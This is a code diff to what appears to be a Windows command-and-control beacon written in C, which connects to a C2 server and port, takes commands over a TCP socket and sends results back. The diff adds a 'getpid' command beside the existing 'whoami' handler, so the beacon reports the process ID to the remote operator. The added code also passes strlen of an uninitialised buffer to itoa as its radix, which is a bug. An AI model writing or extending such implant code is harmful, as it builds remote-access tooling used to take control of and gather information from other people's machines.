@@ -8,6 +8,12 @@
 // DEBUG, TEMP.
 //#include <iostream>
 
+DWORD getpid(){
+	DWORD pid;
+	pid = GetCurrentProcessId();
+	return pid;
+}
+
 void whoami(char* returnval)
 {
 	DWORD bufferlen = 257;
@@ -140,6 +146,16 @@ void StartBeacon(char* C2Server, int C2Port)
 
 			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
 			if (strcmp(RecvData, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
+			else if (strcmp(RecvData, "getpid\n") == 0) {
+				DWORD pid;
+				char buffer[257];
+				pid = getpid();
+				itoa(pid,buffer,strlen(buffer));
+				send(tcpsock,buffer,strlen(buffer)+1,0);
+				// clear buffers
+				memset(buffer, 0, sizeof(buffer));
+				memset(RecvData, 0, sizeof(RecvData));
+			}
 			else if (strcmp(RecvData, "whoami\n") == 0) {
 				char buffer[257] = ""; // reserve buffer with length of 257 bytes
 				whoami(buffer); // call whoami function
